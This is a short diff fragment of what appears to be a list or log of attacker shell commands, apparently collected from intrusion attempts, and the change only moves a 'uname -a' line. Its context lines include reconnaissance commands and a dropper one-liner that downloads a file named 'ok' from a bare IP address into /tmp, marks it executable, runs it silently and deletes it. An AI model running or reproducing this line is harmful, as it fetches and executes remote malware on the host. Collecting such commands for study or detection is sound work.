@@ -35,8 +35,8 @@ id
 echo xsec
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
-uname -a
 /bin/./uname -s -v -n -r -m
+uname -a
 exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
